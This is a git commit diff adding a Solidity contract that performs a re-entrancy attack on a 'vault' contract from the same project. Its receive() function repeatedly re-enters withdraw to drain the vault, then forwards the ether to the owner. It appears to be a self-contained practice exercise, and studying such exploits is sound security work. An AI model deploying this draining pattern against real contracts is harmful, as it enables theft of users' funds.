992ae1a8a73aa96878a7ce25e5072ad6df648c2b
tincan1596 <sahilatwal2003@gmail.com>
2025-07-08 12:14:46 +0000

    reentry attack

--- src/reentry/water.sol
+++ src/reentry/water.sol
@@ -1,2 +1,38 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.30;
+
+import "./iron.sol";
+
+contract reentry {
+    // This contract is a re-entrancy attack example
+    vault public v;
+    address public owner;
+    uint256 public setAmount = 1 ether;
+    bool attack = false;
+
+    constructor(address _vault) payable{
+        v = vault(payable(_vault));
+        owner = msg.sender;
+    }
+
+    function enter() external payable {
+        require(msg.value == setAmount, "Send 1 ether to attack");
+        require(msg.sender == owner, "Only owner can attack");
+        v.deposit{value: msg.value}();
+        //attack the vault by calling withdraw
+        attack = true;
+        v.withdraw(setAmount);
+    }
+
+    // Fallback function to receive ether and re-enter the vault
+    receive() external payable {
+        if(attack && address(v).balance >= setAmount) {
+            v.withdraw(setAmount);
+        } else {
+            attack = false;
+            (bool success, )=owner.call{value:address(this).balance}("");
+            require(success, "ya got fked");
+        }
+    }
+    
+}
